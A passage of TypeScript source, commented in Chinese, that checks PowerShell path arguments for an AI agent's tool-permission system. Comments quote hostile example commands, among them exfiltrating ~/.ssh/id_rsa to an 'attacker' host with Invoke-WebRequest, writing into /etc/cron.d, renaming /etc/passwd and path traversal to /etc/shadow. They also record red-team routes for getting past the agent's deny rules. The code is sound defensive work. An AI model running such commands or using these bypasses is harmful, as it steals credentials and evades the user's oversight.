/**
 * PowerShell 命令参数专用的路径校验。
 *
 * 使用 AST 解析器从 PowerShell 命令中提取文件路径，
 * 并校验它们是否保持在允许的项目目录范围内。
 * 遵循与 BashTool/pathValidation.ts 相同的模式。
 */

import { homedir } from 'os'
import { isAbsolute, resolve } from 'path'
import type { ToolPermissionContext } from '../../Tool.js'
import type { PermissionRule } from '../../types/permissions.js'
import { getCwd } from '../../utils/cwd.js'
import {
  getFsImplementation,
  safeResolvePath,
} from '../../utils/fsOperations.js'
import { containsPathTraversal, getDirectoryForPath } from '../../utils/path.js'
import {
  allWorkingDirectories,
  checkEditableInternalPath,
  checkPathSafetyForAutoEdit,
  checkReadableInternalPath,
  matchingRuleForInput,
  pathInAllowedWorkingPath,
} from '../../utils/permissions/filesystem.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { createReadRuleSuggestion } from '../../utils/permissions/PermissionUpdate.js'
import type { PermissionUpdate } from '../../utils/permissions/PermissionUpdateSchema.js'
import {
  isDangerousRemovalPath,
  isPathInSandboxWriteAllowlist,
} from '../../utils/permissions/pathValidation.js'
import { getPlatform } from '../../utils/platform.js'
import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'
import {
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import { COMMON_SWITCHES, COMMON_VALUE_PARAMS } from './commonParameters.js'
import { resolveToCanonical } from './readOnlyValidation.js'

const MAX_DIRS_TO_LIST = 5
// PowerShell 通配符只有 * ? [ ] — 花括号是【字面】字符
// （没有花括号展开）。包含 {} 会把诸如 `./{x}/passwd` 的路径
// 错误地按 glob-base 截断处理，而不是进行完整路径的符号链接解析。
const GLOB_PATTERN_REGEX = /[*?[\]]/

type FileOperationType = 'read' | 'write' | 'create'

type PathCheckResult = {
  allowed: boolean
  decisionReason?: import('../../utils/permissions/PermissionResult.js').PermissionDecisionReason
}

type ResolvedPathCheckResult = PathCheckResult & {
  resolvedPath: string
}

/**
 * 每个 cmdlet 的参数配置。
 *
 * 每个条目声明：
 *   - operationType: 该 cmdlet 是读取还是写入文件系统
 *   - pathParams: 接受文件路径的参数（针对允许的目录进行校验）
 *   - knownSwitches: 开关参数（不取值）——下一个参数【不会】被当作值消费
 *   - knownValueParams: 需要取值但不是路径的参数——下一个参数【会】被消费，
 *    但【不会】作为路径校验（例如 -Encoding UTF8、-Filter *.txt）
 *
 * 安全模型：任何【不在】上述三类之内的 -Param 都会触发
 * hasUnvalidatablePathArg → ask。这终结了 KNOWN_SWITCH_PARAMS 的
 * “打地鼠”问题——以前每个缺失的开关都会让未知参数启发式逻辑吞掉
 * 下一个参数（可能正是位置路径）。现在第 2 层 cmdlet 仅在调用方式
 * 完全可理解时才会自动放行。
 *
 * 来源：
 *   - Windows PowerShell 5.1 的 (Get-Command <cmdlet>).Parameters
 *   - 官方文档中 PS 6+ 新增项（例如 -AsByteStream、-NoEmphasis）
 *
 * 注意：公共参数（-Verbose、-ErrorAction 等）不在此列出；
 * 它们会在查找时由 COMMON_SWITCHES / COMMON_VALUE_PARAMS 并入。
 *
 * 参数名使用带前导破折号的小写形式，以匹配运行时比较。
 */
type CmdletPathConfig = {
  operationType: FileOperationType
  /** 接受文件路径的参数名（针对允许的目录进行校验） */
  pathParams: string[]
  /** 不取值的开关参数（下一个参数【不会】被消费） */
  knownSwitches: string[]
  /** 需要取值但不是路径的参数（下一个参数【会】被消费，但不做路径校验） */
  knownValueParams: string[]
  /**
   * 接受“叶子文件名”的参数名——该文件由 PowerShell 相对【另一个】参数
   * （而非 cwd）解析。只有当值为简单叶子（不含 `/`、`\`、`.`、`..`）时
   * 才安全地提取。非叶子值会被标记为无法校验，因为 validatePath 是相对
   * cwd 解析的，而不是相对实际基准目录——若要与 -Path 拼接则需要跨参数
   * 追踪。
   */
  leafOnlyPathParams?: string[]
  /**
   * 需要跳过的前导位置参数数量（不会作为路径提取）。
   * 用于位置-0 是非路径值的 cmdlet，例如 Invoke-WebRequest 的位置参数
   * -Uri 是 URL，而非本地文件系统路径。若没有此设置，`iwr http://example.com`
   * 会把 `http://example.com` 当作路径提取，而 validatePath 的 provider 路径
   * 正则（^[a-z]{2,}:）会误判 URL scheme，产生令人困惑的
   * “非文件系统 provider”错误信息。
   */
  positionalSkip?: number
  /**
   * 为 true 时，该 cmdlet 仅当存在 pathParam 时才写入磁盘。
   * 没有路径时（例如不带 -OutFile 的 `Invoke-WebRequest https://example.com`），
   * 它实际上是读取操作——输出进入管道，不会写入文件系统。
   * 跳过“写操作但没有目标路径”的强制 ask。
   * 像 Set-Content 这样【永远】执行的写 cmdlet 不应设置此项。
   */
  optionalWrite?: boolean
}

const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
  // ─── 写入/创建操作 ────────────────────────────────────────────────────
  'set-content': {
    operationType: 'write',
    // -PSPath 和 -LP 是所有 provider cmdlet 上 -LiteralPath 的运行时别名。
    // 没有它们，冒号语法（-PSPath:/etc/x）会落入未知参数分支 →
    // 路径被截获 → paths=[] → deny 规则不再被检查。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'add-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'remove-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'clear-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  // 之前缺失 Out-File/Tee-Object/Export-Csv/Export-Clixml，导致路径级
  // deny 规则（Edit(/etc/**)）能硬拦截 `Set-Content /etc/x`，但对
  // `Out-File /etc/x` 却只是【询问】。这四个都是接收位置文件路径的写 cmdlet。
  'out-file': {
    operationType: 'write',
    // Out-File 使用 -FilePath（位置 0）。-Path 是 -FilePath 在 PowerShell
    // 文档中记录的【别名】——必须放在 pathParams 中，否则 `Out-File -Path:./x`
    // （冒号语法、单个 token）会落入未知参数 → 值被截获 → paths=[] →
    // Edit deny 不再被检查 → ask（安全兜底，但把 deny 降级为 ask）。
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-nonewline',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-inputobject', '-encoding', '-width'],
  },
  'tee-object': {
    operationType: 'write',
    // Tee-Object 使用 -FilePath（位置 0，别名：-Path）。-Variable 不是路径。
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-append'],
    knownValueParams: ['-inputobject', '-variable', '-encoding'],
  },
  'export-csv': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-notypeinformation',
      '-includetypeinformation',
      '-useculture',
      '-noheader',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: [
      '-inputobject',
      '-delimiter',
      '-encoding',
      '-quotefields',
      '-usequotes',
    ],
  },
  'export-clixml': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
    knownValueParams: ['-inputobject', '-depth', '-encoding'],
  },
  // 之前缺失 New-Item/Copy-Item/Move-Item：`mkdir /etc/cron.d/evil` →
  // resolveToCanonical('mkdir') = 'new-item'（通过 COMMON_ALIASES）→ 不在
  // 配置中 → 提前返回 {paths:[], 'read'} → Edit deny 不再被检查。
  //
  // Copy-Item/Move-Item 具有【两个】路径参数（-Path 源，-Destination 目标）。
  // operationType:'write' 并不完美——源在语义上是读取——但这样两个路径都会
  // 得到 Edit-deny 校验，这严格优于一个都不提取。理想的方案是为每个参数
  // 单独设置 operationType，但那会改动更大的 schema；目前用一刀切的 'write'
  // 已经弥合了这个缺口。
  'new-item': {
    operationType: 'write',
    // -Path 是位置 0。-Name（位置 1）由 PowerShell 相对 -Path 解析
    // （根据 MS 文档：“可以在 Name 中指定新项的路径”），支持 `..` 穿越。
    // 我们相对 CWD 解析（validatePath L930），而不是相对 -Path ——因此
    // `New-Item -Path /allowed -Name ../secret/evil` 会创建
    // /allowed/../secret/evil = /secret/evil，但我们解析的是 cwd/../secret/evil，
    // 落到了【别处】，可能漏掉 deny 规则。这是 deny→ask 的降级，而非安全兜底。
    //
    // -name 位于 leafOnlyPathParams：简单叶子文件名（`foo.txt`）会被提取
    // （解析为 cwd/foo.txt——略有偏差，但 -Path 提取已覆盖目录，且叶子
    // 无法穿越）；任何含 `/`、`\`、`.`、`..` 的值会触发 hasUnvalidatablePathArg →
    // ask。将 -Name 与 -Path 拼接才正确，但需要跨参数追踪——此处超出范围。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    leafOnlyPathParams: ['-name'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-itemtype', '-value', '-credential', '-type'],
  },
  'copy-item': {
    operationType: 'write',
    // -Path（位置 0）是源，-Destination（位置 1）是目标。
    // 两者都会被提取；都按写入校验。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-container',
      '-force',
      '-passthru',
      '-recurse',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-fromsession',
      '-tosession',
    ],
  },
  'move-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  // rename-item/set-item：同类——ren/rni/si 在 COMMON_ALIASES 中，也都
  // 不在配置里。`ren /etc/passwd passwd.bak` → 解析为 rename-item →
  // 不在配置 → {paths:[], 'read'} → Edit deny 被绕过。此条目封堵了
  // COMMON_ALIASES→CMDLET_PATH_CONFIG 覆盖审计：每个写 cmdlet 别名
  // 现在都会解析到某个配置条目。
  'rename-item': {
    operationType: 'write',
    // -Path 位置 0，-NewName 位置 1。-NewName 只接受叶子（文档：“无法指定
    // 新驱动器或不同的路径”），且 Rename-Item 会显式拒绝其中的 `..`——
    // 因此这里用 knownValueParams 是对的，与接受穿越的 New-Item -Name 不同。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-newname',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  'set-item': {
    operationType: 'write',
    // FileSystem provider 对 Set-Item 内容会抛出 NotSupportedException，
    // 因此实际的写入面是 registry/env/function/alias 等 provider。
    // 带 provider 限定的路径（HKLM:\\、Env:\\) 在 powershellPermissions.ts
    // 的第 3.5 步会被单独捕获，但这里将 set-item 归类为 write 属于纵深防御——
    // powershellSecurity.ts:379 已把它列入 ENV_WRITE_CMDLETS；这使
    // pathValidation 保持一致。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-value',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  // ─── 读取操作 ────────────────────────────────────────────────────────
  'get-content': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-usetransaction',
      '-wait',
      '-raw',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-readcount',
      '-totalcount',
      '-tail',
      '-first', // alias for -TotalCount
      '-head', // alias for -TotalCount
      '-last', // alias for -Tail
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-delimiter',
      '-encoding',
      '-stream',
    ],
  },
  'get-childitem': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-name',
      '-usetransaction',
      '-followsymlink',
      '-directory',
      '-file',
      '-hidden',
      '-readonly',
      '-system',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-depth',
      '-attributes',
      '-credential',
    ],
  },
  'get-item': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'get-itemproperty': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-itempropertyvalue': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-filehash': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-algorithm', '-inputstream'],
  },
  'get-acl': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-audit', '-allcentralaccesspolicies', '-usetransaction'],
    knownValueParams: ['-inputobject', '-filter', '-include', '-exclude'],
  },
  'format-hex': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-raw'],
    knownValueParams: [
      '-inputobject',
      '-encoding',
      '-count', // PS 6+
      '-offset', // PS 6+
    ],
  },
  'test-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-isvalid', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-pathtype',
      '-credential',
      '-olderthan',
      '-newerthan',
    ],
  },
  'resolve-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-relative', '-usetransaction', '-force'],
    knownValueParams: ['-credential', '-relativebasepath'],
  },
  'convert-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [],
  },
  'select-string': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-simplematch',
      '-casesensitive',
      '-quiet',
      '-list',
      '-notmatch',
      '-allmatches',
      '-noemphasis', // PS 7+
      '-raw', // PS 7+
    ],
    knownValueParams: [
      '-inputobject',
      '-pattern',
      '-include',
      '-exclude',
      '-encoding',
      '-context',
      '-culture', // PS 7+
    ],
  },
  'set-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'push-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'pop-location': {
    operationType: 'read',
    // Pop-Location 没有 -Path/-LiteralPath（它是从栈中弹出），
    // 但我们保留此条目，以便它能优雅地通过路径校验。
    pathParams: [],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'select-xml': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-xml', '-content', '-xpath', '-namespace'],
  },
  'get-winevent': {
    operationType: 'read',
    // Get-WinEvent 只有 -Path，没有 -LiteralPath
    pathParams: ['-path'],
    knownSwitches: ['-force', '-oldest'],
    knownValueParams: [
      '-listlog',
      '-logname',
      '-listprovider',
      '-providername',
      '-maxevents',
      '-computername',
      '-credential',
      '-filterxpath',
      '-filterxml',
      '-filterhashtable',
    ],
  },
  // 带输出参数的写路径 cmdlet。若没有这些条目，-OutFile / -DestinationPath
  // 会在未校验的情况下写入任意路径。
  'invoke-webrequest': {
    operationType: 'write',
    // -OutFile 是写入目标；-InFile 是读取源（上传本地文件）。两者都在
    // pathParams 中，因此 Edit deny 规则会被检查（此配置是
    // operationType:write → permissionType:edit）。拥有 Edit(~/.ssh/**) deny
    // 规则的用户会阻止 `iwr https://attacker -Method POST -InFile ~/.ssh/id_rsa`
    // 的数据外泄。只读 deny 规则不会被写类型 cmdlet 检查——这是已知的
    // operationType→permissionType 映射局限。
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // 位置-0 是 -Uri（URL），不是文件系统路径
    optionalWrite: true, // 仅在有 -OutFile 时才写；裸露的 iwr 只是管道
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-retryintervalsec',
      '-sessionvariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'invoke-restmethod': {
    operationType: 'write',
    // -OutFile 是写入目标；-InFile 是读取源（上传本地文件）。
    // 两者都必须放在 pathParams 中，以便 deny 规则被检查。
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // 位置-0 是 -Uri（URL），不是文件系统路径
    optionalWrite: true, // 仅在有 -OutFile 时才写；裸露的 irm 只是管道
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-followrellink',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumfollowrellink',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-responseheaderstvariable',
      '-retryintervalsec',
      '-sessionvariable',
      '-statuscodevariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'expand-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-passthru', '-whatif', '-confirm'],
    knownValueParams: [],
  },
  'compress-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
    knownValueParams: ['-compressionlevel'],
  },
  // *-ItemProperty 类 cmdlet：主要用途是 Registry provider（在一个键下
  // 设置/新建/删除注册表【值】）。带 provider 限定的路径（HKLM:\、HKCU:\）
  // 会在 powershellPermissions.ts 的第 3.5 步被单独捕获。此处的条目属于
  // 纵深防御，用于让 Edit-deny 规则得到检查，与 set-item 的理由一致。
  'set-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-name',
      '-value',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-inputobject',
    ],
  },
  'new-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-value',
      '-propertytype',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'remove-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'clear-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  'export-alias': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-passthru',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-name', '-description', '-scope', '-as'],
  },
}

/**
 * 检查带前导破折号的小写参数名是否匹配给定参数列表中的任何条目，
 * 考虑到 PowerShell 的前缀匹配行为（例如 -Lit 匹配 -LiteralPath）。
 */
function matchesParam(paramLower: string, paramList: string[]): boolean {
  for (const p of paramList) {
    if (
      p === paramLower ||
      (paramLower.length > 1 && p.startsWith(paramLower))
    ) {
      return true
    }
  }
  return false
}

/**
 * 如果冒号语法值包含会掩盖真实运行时路径的表达式结构（数组、子表达式、
 * 变量、反引号转义），则返回 true。外层 CommandParameterAst 的 'Parameter'
 * 元素类型会把这些隐藏在我们的 AST 遍历之外，因此必须用文本方式检测。
 *
 * 用于 extractPathsFromCommand 的三个分支：pathParams、
 * leafOnlyPathParams 以及未知参数纵深防御分支。
 */
function hasComplexColonValue(rawValue: string): boolean {
  return (
    rawValue.includes(',') ||
    rawValue.startsWith('(') ||
    rawValue.startsWith('[') ||
    rawValue.includes('`') ||
    rawValue.includes('@(') ||
    rawValue.startsWith('@{') ||
    rawValue.includes('$')
  )
}

function formatDirectoryList(directories: string[]): string {
  const dirCount = directories.length
  if (dirCount <= MAX_DIRS_TO_LIST) {
    return directories.map(dir => `'${dir}'`).join(', ')
  }
  const firstDirs = directories
    .slice(0, MAX_DIRS_TO_LIST)
    .map(dir => `'${dir}'`)
    .join(', ')
  return `${firstDirs}，以及另外 ${dirCount - MAX_DIRS_TO_LIST} 个`
}

/**
 * 将路径开头的波浪号（~）展开为用户的主目录。
 */
function expandTilde(filePath: string): string {
  if (
    filePath === '~' ||
    filePath.startsWith('~/') ||
    filePath.startsWith('~\\')
  ) {
    return homedir() + filePath.slice(1)
  }
  return filePath
}

/**
 * 检查用户提供的原始路径（realpath 之前）是否为危险的删除目标。
 * safeResolvePath/realpathSync 会以某些方式规范化路径，从而绕过
 * isDangerousRemovalPath：在 Windows 上 '/' → 'C:\'（无法通过 === '/' 判断）；
 * 在 macOS 上 homedir() 可能位于 /var 之下，realpathSync 会改写为
 * /private/var（无法通过 === homedir() 判断）。对波浪号展开、反斜杠
 * 归一化后的形式进行检查，能捕捉到用户输入时的危险形态（/、~、/etc、/usr）。
 */
export function isDangerousRemovalRawPath(filePath: string): boolean {
  const expanded = expandTilde(filePath.replace(/^['"]|['"]$/g, '')).replace(
    /\\/g,
    '/',
  )
  return isDangerousRemovalPath(expanded)
}

export function dangerousRemovalDeny(path: string): PermissionResult {
  return {
    behavior: 'deny',
    message: `对系统路径 '${path}' 执行 Remove-Item 已被阻止。此路径受删除保护。`,
    decisionReason: {
      type: 'other',
      reason: '删除目标是一个受保护的系统路径',
    },
  }
}

/**
 * 检查解析后的路径是否允许用于给定的操作类型。
 * 沿用 BashTool/pathValidation.ts 中 isPathAllowed 的逻辑。
 */
function isPathAllowed(
  resolvedPath: string,
  context: ToolPermissionContext,
  operationType: FileOperationType,
  precomputedPathsToCheck?: readonly string[],
): PathCheckResult {
  const permissionType = operationType === 'read' ? 'read' : 'edit'

  // 1. 先检查 deny 规则
  const denyRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'deny',
  )
  if (denyRule !== null) {
    return {
      allowed: false,
      decisionReason: { type: 'rule', rule: denyRule },
    }
  }

  // 2. 对于写/创建操作，检查内部可编辑路径（计划文件、草稿本、agent 记忆、任务目录）
  // 此步骤必须在 checkPathSafetyForAutoEdit 之前，因为 .limkenion 是危险目录，
  // 内部可编辑路径位于 ~/.limkenion/ 下——与
  // checkWritePermissionForTool（filesystem.ts 第 1.5 步）中的顺序保持一致
  if (operationType !== 'read') {
    const internalEditResult = checkEditableInternalPath(resolvedPath, {})
    if (internalEditResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalEditResult.decisionReason,
      }
    }
  }

  // 2.5. 对于写/创建操作，检查安全性校验
  if (operationType !== 'read') {
    const safetyCheck = checkPathSafetyForAutoEdit(
      resolvedPath,
      precomputedPathsToCheck,
    )
    if (!safetyCheck.safe) {
      return {
        allowed: false,
        decisionReason: {
          type: 'safetyCheck',
          reason: safetyCheck.message,
          classifierApprovable: safetyCheck.classifierApprovable,
        },
      }
    }
  }

  // 3. 检查路径是否在允许的工作目录内
  const isInWorkingDir = pathInAllowedWorkingPath(
    resolvedPath,
    context,
    precomputedPathsToCheck,
  )
  if (isInWorkingDir) {
    if (operationType === 'read' || context.mode === 'acceptEdits') {
      return { allowed: true }
    }
  }

  // 3.5. 对于读取操作，检查内部可读路径
  if (operationType === 'read') {
    const internalReadResult = checkReadableInternalPath(resolvedPath, {})
    if (internalReadResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalReadResult.decisionReason,
      }
    }
  }

  // 3.7. 对于指向工作目录【之外】的写/创建操作，检查沙箱写入白名单。
  // 当沙箱启用时，用户显式配置了可写目录（例如 /tmp/limkenion/）——
  // 将其视为额外允许的写入目录，这样重定向/Out-File/New-Item 不会无故
  // 弹出提示。位于工作目录【内】的路径被排除：沙箱白名单始终以 '.'
  //（cwd）作为种子，否则会绕过第 3 步的 acceptEdits 门槛。
  if (
    operationType !== 'read' &&
    !isInWorkingDir &&
    isPathInSandboxWriteAllowlist(resolvedPath)
  ) {
    return {
      allowed: true,
      decisionReason: {
        type: 'other',
        reason: '路径位于沙箱写入白名单中',
      },
    }
  }

  // 4. 检查 allow 规则
  const allowRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'allow',
  )
  if (allowRule !== null) {
    return {
      allowed: true,
      decisionReason: { type: 'rule', rule: allowRule },
    }
  }

  // 5. 路径不允许
  return { allowed: false }
}

/**
 * 对被 :: 或反引号语法掩盖的路径做最佳努力的 deny 检查。
 * 只检查 deny 规则——绝不自动放行。如果剥离后的猜测不匹配任何 deny
 * 规则，则照旧回退到 ask。
 */
function checkDenyRuleForGuessedPath(
  strippedPath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): { resolvedPath: string; rule: PermissionRule } | null {
  // 红队 P7：空字节会让 expandPath throw。虽是既有问题，但既然这里
  // 引入了新的调用路径，就一并在此防御。
  if (!strippedPath || strippedPath.includes('\0')) return null
  // 红队 P3：`~/.ssh/x 剥离后是 ~/.ssh/x，但 expandTilde 只对前导 ~ 生效
  // ——反引号在其前面。这里重新执行。
  const tildeExpanded = expandTilde(strippedPath)
  const abs = isAbsolute(tildeExpanded)
    ? tildeExpanded
    : resolve(cwd, tildeExpanded)
  const { resolvedPath } = safeResolvePath(getFsImplementation(), abs)
  const permissionType = operationType === 'read' ? 'read' : 'edit'
  const denyRule = matchingRuleForInput(
    resolvedPath,
    toolPermissionContext,
    permissionType,
    'deny',
  )
  return denyRule ? { resolvedPath, rule: denyRule } : null
}

/**
 * 校验一个文件系统路径，处理波浪号展开。
 */
function validatePath(
  filePath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): ResolvedPathCheckResult {
  // 去掉可能存在的首尾引号
  const cleanPath = expandTilde(filePath.replace(/^['"]|['"]$/g, ''))

  // 安全：PowerShell Core 在所有平台上都会把反斜杠归一化为正斜杠，
  // 但 Linux/Mac 上的 path.resolve 会把它们当作字面字符处理。
  // 在解析前归一化，这样 dir\..\..\etc\shadow 之类的穿越模式能被正确检测。
  const normalizedPath = cleanPath.replace(/\\/g, '/')

  // 安全：反引号（`）是 PowerShell 的转义字符。它在许多位置是空操作
  // （例如 `/ === /），但却能骗过 Node.js 的路径检测，比如 isAbsolute()。
  // 重定向目标使用原始的 .Extent.Text，它保留了反引号转义。
  // 将任何含有反引号的路径视为无法校验。
  if (normalizedPath.includes('`')) {
    // 红队 P3：对于 StringConstant 参数，反引号已被解析
    //（解析器使用 .value）；此守卫主要针对使用原始 .Extent.Text 的
    // 重定向目标。对多数特殊转义（`n → n）来说剥离是空操作，但没关系——
    // 猜测错误 → 无 deny 匹配 → 回退到 ask。
